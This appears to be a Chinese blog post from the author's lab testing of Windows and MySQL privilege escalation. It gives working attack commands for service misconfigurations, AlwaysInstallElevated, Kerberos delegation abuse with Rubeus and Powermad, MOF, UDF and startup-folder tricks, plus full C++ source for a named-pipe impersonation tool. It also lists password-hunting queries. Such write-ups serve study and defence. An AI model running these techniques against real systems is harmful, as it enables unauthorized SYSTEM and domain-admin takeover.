+<p><img alt="QQ截图20210217144053" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217144053.png" title="QQ截图20210217144053" /></p>
+<p>然后我们现在是没有能力重启服务的。。只能等管理员重启服务或者机子重启。然后就拿到SYSTEM权限了。但是这里还有一个坑点，这个坑点是如果一个服务启动后在一定时间内未与 Service Control Manager(SCM) 通讯，就会被停止。</p>
+<p><img alt="QQ截图20210217144102" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217144102.png" title="QQ截图20210217144102" /></p>
+<p>所以我们要在拿到shell后及时的转移进程或者添加管理员账户。
+转移进程在msf中很简单，meterpreter中先用ps查看进程，随便找一个system权限，记住其pid，然后 migrate PID 即可完成进程迁移。</p>
+<p>下面来说说防治方法吧。进入注册表修改窗口，在 HKEY_LOCAL_MACHINE &gt;&gt; SYSTEM &gt;&gt; CurrentControlSet &gt;&gt; Services 路径下找到存在漏洞的服务，修改其ImagePath，把路径前后加个引号就可了。</p>
+<h2 id="vulnerable-services">易受攻击的服务（<strong>Vulnerable Services</strong> ）</h2>
+<p>同样看脸且被动</p>
+<p>这个攻击方法大致分两类
+1.替换服务的二进制文件。这个方法较为简单，如果对服务二进制文件所在目录有修改权，那么我们完全可以创建一个恶意程序来替换原有的二进制文件服务。这个比较简单，而且基本上攻击流程和<strong>Trusted Service Paths</strong>如出一辙，同样也是比较被动地等待重启服务才能弹shell，就不再演示了。
+2.修改服务的属性。如果我们能修改服务的 <strong>BINARY_PATH_NAME</strong> 属性（这个属性用于指向服务的二进制文件），我们就可以通过设置 <strong>BINARY_PATH_NAME</strong> 的值为系统命令，然后重启服务时我们的系统命令会被执行。</p>
+<p>对于后者，我们需要一款工具来快速揭示出我们能修改哪些服务的属性。
+这个工具我们采用accesschk.exe，它是微软产出的，基本不会报毒。</p>
+<p>我们通过该工具执行以下命令</p>
+<pre><code class="language-纯文本">accesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteula
+or
+accesschk.exe -uwcqv &quot;Users&quot; * /accepteula
+来查看Users组（根据实际情况来填哪个组）对哪些服务有哪些权限
+</code></pre>
+<p>如果对某个服务有service_all_access或者以下权限，就说明能对其属性进行修改。</p>
+<p><img alt="QQ截图20210217144124" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217144124.png" title="QQ截图20210217144124" /></p>
+<p>比如我们对Spooler服务有service_all_access权限，我们就可以这样做。
+通过修改其binPath为恶意指令，然后等待管理员重启服务，我们的恶意指令就会被执行。</p>
+<p><img alt="QQ截图20210217144141" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217144141.png" title="QQ截图20210217144141" /></p>
+<h2 id="alwaysinstallelevated"><strong>AlwaysInstallElevated</strong></h2>
+<p>如果windows启用了如下注册表项</p>
+<pre><code class="language-纯文本">[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer]
+“AlwaysInstallElevated”=dword:00000001 
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]
+“AlwaysInstallElevated”=dword:00000001
+</code></pre>
+<p>那么所有msi（windows应用安装程序）都会以SYSTEM权限运行。此时如果我们执行一个恶意msi程序，即可达到提权目的
+同时需要注意的一点是，这个注册表项不一定总是存在的。（比如我的实验机</p>
+<p>我们可以通过reg query来验证这两条注册表项的情况</p>
+<pre><code class="language-纯文本">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</code></pre>
+<p>若均为1，我们就可以通过msfvenom生成恶意msi来提权</p>
+<pre><code class="language-纯文本">msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi
+</code></pre>
+<p>然后执行，获得一个管理员账户。</p>
+<h2 id="_1">信息泄露</h2>
+<p><em>Unattend.xml</em> <em>sysprep.xml和sysprep.inf文件</em><code>GPP.xml</code> 存在着一定信息泄露，他们通常存在于以下路径</p>
+<pre><code class="language-纯文本">C:\Windows\Panther\
+C:\Windows\Panther\Unattend\
+C:\Windows\System32\
+C:\Windows\System32\sysprep\
+</code></pre>
+<p>找到后，找到 <em>Unattend.xml</em> 文件中的  标签。就有可能找到用户的加密后的密码。。</p>
+<pre><code class="language-纯文本">&lt;UserAccounts&gt;
+    &lt;LocalAccounts&gt;
+        &lt;LocalAccount&gt;
+            &lt;Password&gt;
+                &lt;Value&gt;UEBzc3dvcmQxMjMhUGFzc3dvcmQ=&lt;/Value&gt; //PASSWORD
+                &lt;PlainText&gt;false&lt;/PlainText&gt;
+            &lt;/Password&gt;
+            &lt;Description&gt;Local Administrator&lt;/Description&gt;
+            &lt;DisplayName&gt;Administrator&lt;/DisplayName&gt;
+            &lt;Group&gt;Administrators&lt;/Group&gt;
+            &lt;Name&gt;Administrator&lt;/Name&gt;
+        &lt;/LocalAccount&gt;
+    &lt;/LocalAccounts&gt;
+&lt;/UserAccounts&gt;
+一些敏感文件查询指令
+C:\Users\user\Desktop&gt; dir C:\ /s /b /c | findstr /sr \*password\*
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+</code></pre>
+<h2 id="_2">基于资源的域委派攻击</h2>
+<p>refer:<a href="https://xz.aliyun.com/t/7454" title="https://xz.aliyun.com/t/7454">https://xz.aliyun.com/t/7454</a></p>
+<h4 id="_3">原理的几个点：</h4>
+<p>1.S4U2SELF 协议可以在用户没有配置 TrustedToAuthenticationForDelegation 属性（即开启使用任何协议认证的约束性委派）时被调用，但是返回的ST是不可被转发的。
+2.基于资源的约束性委派主机 在被另一台主机委派访问时，在S4U2PROXY过程中提交过来的ST如果即使是不可转发的。KDC依旧会返回有效的ST2。
+3.每个普通域用户默认可以创建至多十个机器账户（ 由MachineAccountQuota属性决定 ），每个机器账户被创建时都会自动注册SPN: <code>RestrictedKrbHost/domain</code>和<code>HOST/domain</code>这两个SPN</p>
+<h4 id="_4">攻击流程:</h4>
+<p>假设开启基于资源的约束性委派机器为A
+1.首先要有一个对当前计算机有写权限的账户，才能对A设置可以 被 委派访问的服务账户。
+2.利用当前账户创建一个机器账户，并配置好机器账户到A的 基于资源的约束性委派
+3.因为机器账户是我们创建的，我们知道他的密码账户，可以让它利用S4U2SELF协议获得一个不可转发ST。然后用这个不可转发ST通过S4U2PROXY，在基于资源的约束性委派基础上获得有效的访问A cifs服务的ST2。
+4.用ST2访问A的CIFS服务，权限获得。</p>
+<h4 id="_5">实操</h4>
+<p>这个攻击说白了就是个提权...</p>
+<p>首先我们检查一下域控是否是win2012以上的主机，因为只有这样才能开启 基于资源的约束性委派。</p>
+<p>我们使用powersploit下的powerview脚本。执行命令 get-netdomaincontroller</p>
+<p><img alt="QQ截图20210217135833" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217135833.png" title="QQ截图20210217135833" /></p>
+<p>可以获得域控WIN版本</p>
+<p>然后我们查看当前用户对哪台主机有写权限。因为是实验，所以我们先来看看怎么配置一个用户对一个机器的权限。
+直接在域控上找到某主机，然后进入在属性里进入安全选项卡，添加某用户，然后给这个用户分配权限即可。</p>
+<p><img alt="QQ截图20210217135859" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217135859.png" title="QQ截图20210217135859" /></p>
+<p>我们依旧使用powerview。先调用
+<code>Get-DomainUser -Identity username -Properties objectsid</code>来获取当前用户SID
+然后<code>Get-DomainObjectAcl -Identity 主机名 | ?{$_.SecurityIdentifier -match "刚刚得到的SID"}</code> 查看当前用户对某台主机是否有写权限。</p>
+<p><img alt="QQ截图20210217140628" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217140628.png" title="QQ截图20210217140628" /></p>
+<p>如果有 GenericAll（完全控制权），GenericWrite、WriteProperty、WriteDacl 这些属性，就说明该用户能修改计算机的账户属性。
+如图看到我们对WIN7进行操作</p>
+<p>好的，我们接下来就要创立一个机器用户了。根据网上搜索结果，使用powermad这个ps脚本可以很快捷的创建一个机器用户。<a href="https://github.com/Kevin-Robertson/Powermad" title="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p>
+<pre><code class="language-纯文本">Import-Module .\Powermad.ps1New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString &quot;hack&quot; -AsPlainText -Force)
+</code></pre>
+<p><img alt="QQ截图20210217140659" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217140659.png" title="QQ截图20210217140659" /></p>
+<p>好的，我们添加了一个密码hack，名为hacksystem的机器账户，接下来就是配置hacksystem到WIN7的委派了。我们需要做的，是修改WIN7的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的值 ，这个操作我们用powerview实现。</p>
+<pre><code class="language-纯文本">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&quot;  
+#这儿的sid是我们创建的#机器用户#evilsystem的sid
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer WIN7| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+</code></pre>
+<p><img alt="QQ截图20210217140726" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217140726.png" title="QQ截图20210217140726" /></p>
+<p>至于机器账户SID怎么获得，powerview下的 <code>get-domiancomputer hacksystem</code>
+然后使用<code>Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity</code> 查看委派是否设置成功</p>
+<p><code>Set-DomainObject win7 -Clear 'msds-allowedtoactonbehalfofotheridentity' -Verbose</code>此命令可以清除 msds-allowedtoactonbehalfofotheridentity属性的值</p>
+<p>现在都统统设置好了，开始下一步吧。
+网上一般用的rubeus，这里我用kekeo吧</p>
+<pre><code class="language-纯文本">Rubeus.exe hash /user:xxx /password:xxx /domain:xxx
+</code></pre>
+<p>本地运算出机器用户ntlm hash 这里借用一下别人的图</p>
+<p><img alt="QQ截图20210217140944" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217140944.png" title="QQ截图20210217140944" /></p>
+<p><code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code> 写入票据</p>
+<p>然后我在本机使用以上方法后klist一下，发现确实存在票据</p>
+<p><img alt="QQ截图20210217140737" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217140737.png" title="QQ截图20210217140737" /></p>
+<p>但是dir \test1\c\$时本机莫名其妙不能进行kerberos验证，我服了》。。但不管怎样，我们拿到银票了</p>
+<h4 id="_6">敏感用户不可委派的绕过</h4>
+<p><img alt="QQ截图20210217141050" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217141050.png" title="QQ截图20210217141050" /></p>
+<p>若我们的administrator用户被设置为敏感用户不可委派或者被加入保护组，按理说他的访问就不能进行委派。</p>
+<p>我们在以administrator账户身份进行S4U时，只能进行S4U2SELF，不能进行S4U2PROXY。我们用 <code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code>继续实验administrator，发现确实是这样</p>
+<p><img alt="QQ截图20210217141131" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217141131.png" title="QQ截图20210217141131" /></p>
+<p>此时我们用 rubeus.exe describe /ticker:S4Ubase64加密的票据</p>
+<p><img alt="QQ截图20210217141313" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217141313.png" title="QQ截图20210217141313" /></p>
+<p>可以发现servicename并没有指定某个服务，仅仅只有一个账户.即发生了服务名称缺失的问题。很简单，把票据修改一下就行了.网上很多说用这个工具
+<a href="https://www.pkisolutions.com/tools/asn1editor/" title="https://www.pkisolutions.com/tools/asn1editor/">https://www.pkisolutions.com/tools/asn1editor/</a>
+但实际上rubeus也能完成票据修改<code>rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt</code></p>
+<p><img alt="QQ截图20210217141325" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217141325.png" title="QQ截图20210217141325" /></p>
+<p><img alt="QQ截图20210217141339" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217141339.png" title="QQ截图20210217141339" /></p>
+<p>完事</p>
+<h2 id="potato">POTATO 家族</h2>
+<h3 id="hot-potato">hot potato</h3>
+<p>热土豆提权。很早前就听说过了，但一直没去了解过。前置知识是ntlm relay,可以去了解了解。 potato家族有很多，hot potato只是其中一种提权方式。
+我环境有问题，不能很好的复现🙃，抓包分析啥的先咕咕吧。</p>
+<p><a href="https://github.com/foxglovesec/Potato👈工具" title="https://github.com/foxglovesec/Potato👈工具">https://github.com/foxglovesec/Potato👈工具</a>
+<a href="https://foxglovesecurity.com/2016/01/16/hot-potato/" title="https://foxglovesecurity.com/2016/01/16/hot-potato/">https://foxglovesecurity.com/2016/01/16/hot-potato/</a> 👈HOT POTATO技术文档，国内基本上翻译这个来的。</p>
+<p>提权步骤大概是这个流程
+1.本地nbns服务欺骗
+2.wpad劫持
+3.HTTP-&gt;SMB 的 ntlm relay</p>
+<p>1.本地nbns服务欺骗</p>
+<p>Windows域名解析规则是
+本地HOST文件-》dns查询-》NBNS或者LLMNR查询
+一旦本地发出NBNS查询，我们本地就可以迅速响应，啪的一下就响应了，很快啊，本地发包很快，只要发出NBNS包基本上都能被我们本地发包响应。
+但是以上步骤还是有一些细节的：我们当前并非管理员权限，大几率是无法嗅探本地流量的,如果我们能够事先知道目标主机期望NBNS查询获得的主机名，我们可以伪造一个响应，对发送NBNS查询的那个主机快速的大量发送NBNS响应 .但是nbns流量包还有个叫特征码的东西，请求包和响应包的特征码必须相同，所以我们被迫发送65536个包爆破这个特征码——本地发包速度很快，本地NBNS欺骗成功率基本上在100%。</p>
+<p>2.WPAD劫持</p>
+<p>NBNS欺骗后我们就可以劫持WPAD的域名，把自己伪造称WPAD并返回自定义的PAC文件。意味着我们可以把本地发出的所有流量重定向。</p>
+<p>3.RELAY</p>
+<p>在现在这个年代，SMB-&gt;SMB的relay很少用到了，微软 禁用了同协议的NTLM认证 ，成功率很低。
+但是HTTP-&gt;SMB的relay还是有的。HOT POTATO就是利用的这一点。
+我们可以把主机发出的HTTP请求重定向到我们自定义的网页A，而网页A需要NTLM认证，我们就可以进行HTTP-&gt;SMB的relay’了。当HTTP请求来自于高权限的账户时，例如是来自windows 更新服务的请求，命令就会以”NT AUTHORITY\SYSTEM”权限运行。</p>
+<p>HOT POTATO 根据Windows版本的不同，需要等待高权限用户NTLM认证来到的时间也不同。一般来说，
+WIN7是瞬间就可以提权的
+Windows Server 2012 R2,Windows Server 2012,Windows 8.1,Windows 8有一个自动更新机制，会每天下载证书信任列表(CTLs)
+,etc</p>
+<h2 id="mysql">MYSQL下的提权技术</h2>
+<h3 id="mof">MOF提权</h3>
+<p>在c:/windows/system32/wbem/mof/目录下的nullevt.mof每分钟都会有一个特定的时间去执行一次（由”And TargetInstance.Second = 5″;控制，这里输入5就是每分钟的第五秒执行。 那么把cmd命令添加到nullevt.mof中，cmd命令就会自动执行了。</p>
+<p>前提是我们要能进入数据库进行操作，且mysql数据库的权限尽可能高才更有利。同时secure-file-priv 要为空（ mysql 5.6.34版本以后 secure_file_priv的值默认为NULL,禁止所有文件导入导出功能）</p>
+<p>我们伪造的MOF文件格式如下</p>
+<pre><code class="language-纯文本">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) 
+
+instance of __EventFilter as $EventFilter 
+{ 
+    EventNamespace = &quot;Root\\Cimv2&quot;; 
+    Name  = &quot;filtP2&quot;; 
+    Query = &quot;Select * From __InstanceModificationEvent &quot; 
+            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; 
+            &quot;And TargetInstance.Second = 5&quot;; 
+    QueryLanguage = &quot;WQL&quot;; 
+}; 
+
+instance of ActiveScriptEventConsumer as $Consumer 
+{ 
+    Name = &quot;consPCSV2&quot;; 
+    ScriptingEngine = &quot;JScript&quot;; 
+    ScriptText = 
+    &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin /add\&quot;)&quot;;   //修改此处即可
+}; 
+
+instance of __FilterToConsumerBinding 
+{ 
+    Consumer   = $Consumer; 
+    Filter = $EventFilter; 
+}; 
+</code></pre>
+<p>修改上面的cmd部分即可实现以管理员身份执行各种命令。
+然后我们使用mysql下的命令 ，将mof覆盖过去。
+待我们的命令被执行后，即代表提权成功。
+Windows 2003似乎成功率蛮高的，WIN7试了试没反应。。。</p>
+<h3 id="udf">UDF提权</h3>
+<p>（这个也可以linux提权</p>
+<p>udf，即自定义函数（user define function）</p>
+<p>MYSQL可以自定义函数的。自定义函数在Windows下是以DLL文件存在于MYSQL的插件文件夹里面的（linux则是以os的形式）。我们可以自定义一个恶意dll，里面存放着可以执行系统命令的 函数。然后交给mysql以数据库权限执行。</p>
+<p>前提：我们能操作数据库，且数据库权限必须很高（我们用这个方法提权到的权限就是数据库的权限</p>
+<p>那么这个dll文件哪里来呢。sqlmap和msf都有。sqlmap下的 sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ 就是这个dll文件的编码版本。我们使用sqlmap下的sqlmap/extra/cloak/cloak.py对其进行解码获得dll文件。</p>
+<pre><code class="language-纯文本">python ./cloak.py -d -i ./lib_mysqludf_sys.dll_  即可获得dll文件
+</code></pre>
+<p>然后我们把dll文件放入mysql的插件文件夹，命名为udf.dll。插件文件夹可以通过命令</p>
+<pre><code class="language-纯文本">show variables like &quot;%plugin%&quot;;获得  （/lib/plugin文件夹需要自己创建）
+</code></pre>
+<p>至于怎么把dll放入插件文件夹</p>
+<p>1.直接粘贴复制 （权限可能不够
+2.使用命令 select load_file(‘udf.dll’) into dumpfile “PLUGIN的路径”;(需要secure_file_priv为空</p>
+<p>总之，如果把udf.dll放入plugin文件夹后，我们就可以执行以下操作提权了。</p>
+<pre><code class="language-纯文本">create funtion sys_eval returns string soname &quot;udf.dll&quot;;
+select sys_eval('cmd');
+</code></pre>
+<p><img alt="QQ截图20210217144509" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217144509.png" title="QQ截图20210217144509" /></p>
+<h3 id="_7">启动项提权</h3>
+<p>说白了，就是通过mysql的高权限，向windows开机启动项文件夹里放入恶意vbs或者bat脚本,机器重启后自动执行。怎么让机器重启？等管理员或者 一些可导致服务器蓝屏的EXP
+启动项路径一般为：
+C:\Documents and Settings\All Users\「开始」菜单\程序\启动
+C:\Users\username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p>
+<pre><code class="language-纯文本">select load_file(&quot;xxx&quot;) into dumpfile &quot;xxxx&quot;;
+</code></pre>
+<p><img alt="QQ截图20210217144534" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217144534.png" title="QQ截图20210217144534" /></p>
+<p>没什么好说的</p>
+<h2 id="_8">命名管道提权</h2>
+<p>提权方式为 令牌模仿。 Token Impersonation .</p>
+<p>meterpreter的getsystem的提取方法之一就是这个方法</p>
+<p>提权过程为从administrator用户提到SYSTEM权限。从普通用户提权到admin及以上权限是不可取的，因为普通用户创建的命名管道没有 <code>SeImpersonatePrivilege</code>，在复制令牌时会出现1346错误。</p>
+<p>该方法技术细节为：以管理员权限创建一个命名管道，再通过创建SYSTEM权限服务，让服务连上命名管道，随后我们通过模拟客户端，获得SYSTEM权限的令牌，随后将其复制，再用复制后的令牌创建新进程（如CMD)，新进程的权限即SYSTEM权限。</p>
+<p>这里贴上实现代码.
+首先是被创建的服务的实现代码，该服务启动后会不断向服务器命名管道建立链接
+生成好后，是Service.exe</p>
+<pre><code class="language-纯文本">#include&lt;Windows.h&gt;
+#include&lt;iostream&gt;
+SERVICE_STATUS m_ServiceStatus;
+SERVICE_STATUS_HANDLE m_ServiceStatusHandle;
+BOOL bRunning;
+void WINAPI ServiceMain(DWORD argc, LPTSTR* argv);
+void WINAPI HandlerFunc(DWORD code);
+int main() {
+  WCHAR Servicename[] = L&quot;ServiceA&quot;;
+  SERVICE_TABLE_ENTRY Table[] = { {Servicename,ServiceMain},{NULL,NULL} };
+  StartServiceCtrlDispatcher(Table);
+}
+
+void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
+
+
+  m_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
+  m_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
+  m_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
+  m_ServiceStatus.dwWin32ExitCode = 0;
+  m_ServiceStatus.dwServiceSpecificExitCode = 0;
+  m_ServiceStatus.dwCheckPoint = 0;
+  m_ServiceStatus.dwWaitHint = 0;
+
+  m_ServiceStatusHandle = RegisterServiceCtrlHandler(L&quot;ServiceA&quot;, HandlerFunc);
+  m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
+  m_ServiceStatus.dwCheckPoint = 0;
+  m_ServiceStatus.dwWaitHint = 0;
+  SetServiceStatus(m_ServiceStatusHandle, &amp;m_ServiceStatus);
+  bRunning = true;
+  while (bRunning) {
+  LPCWSTR PipeName = L&quot;\\\\.\\pipe\\testpipe&quot;;
+  HANDLE PipeHandle=NULL;
+  BOOL PipeInstance;
+  WCHAR message[512] = { 0 };
+  DWORD bytesWritten = 0;
+  BOOL Flag = true;
+  wchar_t message2[] = L&quot;HELL&quot;;
+  DWORD messageLength = lstrlen(message2) * 2;
+  do {
+    PipeHandle = CreateFile(PipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+  } while (PipeHandle == INVALID_HANDLE_VALUE);
+
+  WriteFile(PipeHandle, &amp;message2, messageLength, &amp;bytesWritten, NULL);
+
+  Flag = ReadFile(PipeHandle, &amp;message, 512, &amp;bytesWritten, NULL);
+  std::cout &lt;&lt; &quot;Message:&quot; &lt;&lt; message &lt;&lt; std::endl;
+  }
+}
+
+void WINAPI HandlerFunc(DWORD code) {
+  switch (code) {
+  case SERVICE_CONTROL_PAUSE:
+    m_ServiceStatus.dwCurrentState = SERVICE_PAUSED;
+    break;
+  case SERVICE_CONTROL_CONTINUE:
+    m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
+    break;
+  case SERVICE_CONTROL_STOP:
+    m_ServiceStatus.dwWin32ExitCode = 0;
+    m_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+    m_ServiceStatus.dwCheckPoint = 0;
+    m_ServiceStatus.dwWaitHint = 0;
+
+    SetServiceStatus(m_ServiceStatusHandle, &amp;m_ServiceStatus);
+    bRunning = false;
+    break;
+  case SERVICE_CONTROL_INTERROGATE:
+    break;
+  }
+}
+</code></pre>
+<p>然后是主体，命名管道服务器。生成后是Server.exe</p>
+<pre><code class="language-纯文本">  #include&lt;Windows.h&gt;
+  #include&lt;iostream&gt;
+
+  int main() {
+    LPCWSTR pipeName = L&quot;\\\\.\\pipe\\testpipe&quot;;
+    LPVOID pipeBuffer = NULL;
+    HANDLE serverPipe;
+    DWORD readBytes = 0;
+    DWORD readBuffer = 0;
+    int err = 0;
+    BOOL isPipeConnected;
+    BOOL isPipeOpen;
+    wchar_t message[] = L&quot;HELL&quot;;
+    DWORD messageLenght = lstrlen(message) * 2;
+    DWORD bytesWritten = 0;
+    WCHAR message2[512] = { 0 };
+  //Open a Named Pipe,Wait for a connection
+    std::wcout &lt;&lt; &quot;Creating named pipe &quot; &lt;&lt; pipeName &lt;&lt; std::endl;
+    serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
+
+  //Create a service of system to connect to our NamedPipe.
+
+    char servicename[] = &quot;Service.exe&quot;;
+    char servicepath[_MAX_PATH];
+    SERVICE_STATUS status;
+    GetModuleFileNameA(LoadLibraryA(servicename), servicepath, sizeof(servicepath));
+    SC_HANDLE scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
+    if (GetLastError() == 0) {
+
+    }
+    else {
+      std::cout &lt;&lt; &quot;ERROR OpenSCManager:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
+    }
+    SC_HANDLE scService = CreateServiceA(scManager, servicename, servicename,
+      SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
+      servicepath, NULL, NULL, NULL, NULL, NULL);
+    if (!scService) {
+      if (GetLastError() == 1073) {
+        std::cout &lt;&lt; &quot;The Service has been exsisted&quot; &lt;&lt; std::endl;
+      }
+      else {
+        std::cout &lt;&lt; &quot;ERROR CreateServiceA:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
+      }
+    }
+    SC_HANDLE scServiceA = OpenServiceA(scManager, servicename, SERVICE_ALL_ACCESS);
+    if (StartService(scServiceA, 0, NULL)) {
+      std::cout&lt;&lt;&quot;service Start success&quot;&lt;&lt;std::endl;
+    }
+    else {
+      if (GetLastError() == 1056) {
+        std::cout &lt;&lt; &quot;service is running,don't need to start again&quot; &lt;&lt; std::endl;
+      }
+    }
+  //Connect !
+    isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
+
+    if (isPipeConnected) {
+      std::wcout &lt;&lt; &quot;Incoming connection to &quot; &lt;&lt; pipeName &lt;&lt; std::endl;
+      ReadFile(serverPipe, &amp;message2, 512, &amp;bytesWritten, NULL);
+      std::cout &lt;&lt; message2;
+    }
+    else {
+      std::cout &lt;&lt; &quot;Does not connected Error: &quot;&lt;&lt;GetLastError() &lt;&lt; std::endl;
+    }
+
+    std::wcout &lt;&lt; &quot;Sending message: &quot; &lt;&lt; message &lt;&lt; std::endl;
+    WriteFile(serverPipe, message, messageLenght, &amp;bytesWritten, NULL);
+  //Toekn Impersonation
+    std::wcout &lt;&lt; &quot;Impersonating the client...&quot; &lt;&lt; std::endl;
+    if (!ImpersonateNamedPipeClient(serverPipe)) {
+      std::cout&lt;&lt;&quot;ImpersonateNamedPipeClient ERROR: &quot;&lt;&lt;GetLastError()&lt;&lt;std::endl;
+    }
+    else {
+    std::cout &lt;&lt; &quot;ImpersonateNamedPipeClient success&quot; &lt;&lt; std::endl;
+    }
+
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi = {};
+    ZeroMemory(&amp;pi, sizeof(pi));
+    ZeroMemory(&amp;si, sizeof(si));
+    si.cb = sizeof(si);
+    HANDLE token;
+    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &amp;token)) {
+      std::cout &lt;&lt; &quot;GetCurrentThread ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
+    }
+
+    CHAR command1[] = &quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&quot;;
+    WCHAR command2[] = L&quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&quot;;
+    HANDLE Token;
+    if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenImpersonation,&amp;Token)) {
+      std::cout &lt;&lt; &quot;DuplicateTokenEx ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
+    }
+    else {
+      std::cout &lt;&lt; &quot;Impersonate completed&quot; &lt;&lt; std::endl;
+    }
+    if (!CreateProcessAsUserA(token, NULL, command1, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi)) {
+      std::cout &lt;&lt; &quot;CreateProcessAsUserA ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt;&quot; Now Use CreateProcessWithTokenW&quot;&lt;&lt; std::endl;
+      if (!CreateProcessWithTokenW(token, LOGON_NETCREDENTIALS_ONLY, NULL, command2, NULL, NULL, NULL, (LPSTARTUPINFOW)&amp;si, &amp;pi)) {
+        std::cout &lt;&lt; &quot;CreateProcessWithTokenW ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
+      }
+      else {
+        std::cout &lt;&lt; &quot;CreateProcessWithTokenW success&quot; &lt;&lt; std::endl;
+      }
+    }
+    else {
+      std::cout &lt;&lt; &quot;CreateProcessWithTokenW success&quot; &lt;&lt; std::endl;
+    }
+
+    while(1){}
+  }
+</code></pre>
+<p>我们生成了Service.exe,然后把他移到Server.exe同级目录，以管理员权限运行Server.exe,即可达到admin-》system的提权。</p>
+<p><img alt="QQ截图20210217144553" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217144553.png" title="QQ截图20210217144553" /></p>
+<p>程序写了四天终于写好了。。WIN7下可以实现完美提权。
+项目地址:<a href="https://github.com/ConsT27/EvilNamedPipe/tree/1.0" title="https://github.com/ConsT27/EvilNamedPipe/tree/1.0">https://github.com/ConsT27/EvilNamedPipe/tree/1.0</a></p>
+<h2 id="_9">令牌窃取</h2>
+<p>SYSTEM-&gt;本机上其他用户（包括域用户）(好家伙，只要本机有system权限，域管敢在本机上创建进程就直接能拿到域管权限） 或者admin获取debug权限后去获取SYSTEM权限（这里有一个细节点，只有owner为administrator的SYSTEM进程才能被利用，比如lsass，dllhost)</p>
+<p>技术细节:通过寻找高权限开启的进程，再复制其令牌用以创建新进程，即可达到提权目的</p>
